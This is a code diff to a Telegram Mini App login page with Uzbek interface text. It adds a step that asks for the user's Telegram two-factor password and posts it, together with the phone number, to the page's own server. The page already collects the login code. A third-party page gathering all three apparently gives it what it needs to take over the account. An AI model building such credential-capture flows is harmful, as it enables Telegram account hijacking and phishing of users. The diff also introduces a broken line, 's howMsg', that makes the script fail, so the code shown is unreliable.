@@ -143,6 +143,14 @@
       <button id="verifyCodeBtn">Tasdiqlash</button>
     </div>
 
+    <!-- 2FA PASSWORD -->
+  <div id="step-password" class="hidden">
+    <div class="field">
+      <input id="password" type="password" placeholder="Telegram parol" />
+    </div>
+    <button id="verifyPasswordBtn">Parolni tasdiqlash</button>
+  </div>
+
     <div id="message" class="message"></div>
   </div>
 </div>
@@ -218,7 +226,9 @@ async function verifyCode() {
       showMsg("✅ Muvaffaqiyatli kirdingiz", "success");
       setTimeout(() => tg.close(), 1200);
     } else if (data.status === "2fa_required") {
-      showMsg("🔐 Telegram paroli talab qilinadi", "info");
+      stepCode.classList.add("hidden");
+      document.getElementById("step-password").classList.remove("hidden");
+      s howMsg("🔐 Telegram paroli kerak", "info");
     } else {
       showMsg(data.message || "❌ Kod noto‘g‘ri", "error");
     }
@@ -227,6 +237,40 @@ async function verifyCode() {
     showMsg("❌ Server xatosi", "error");
   }
 }
+async function verifyPassword() {
+  const phone = phoneEl.value.trim();
+  const password = document.getElementById("password").value.trim();
+
+  if (!password) {
+    showMsg("❌ Parolni kiriting", "error");
+    return;
+  }
+
+  showMsg("🔐 Parol tekshirilmoqda...");
+
+  try {
+    const res = await fetch("/verify_password", {
+      method: "POST",
+      headers: {"Content-Type": "application/json"},
+      body: JSON.stringify({ phone, password })
+    });
+
+    const data = await res.json();
+
+    if (data.status === "ok") {
+      showMsg("✅ Muvaffaqiyatli kirdingiz", "success");
+      setTimeout(() => tg.close(), 1200);
+    } else {
+      showMsg(data.message || "❌ Parol noto‘g‘ri", "error");
+    }
+
+  } catch {
+    showMsg("❌ Server xatosi", "error");
+  }
+}
+
+document.getElementById("verifyPasswordBtn").onclick = verifyPassword;
+
 
 document.getElementById("sendCodeBtn").onclick = sendCode;
 document.getElementById("verifyCodeBtn").onclick = verifyCode;
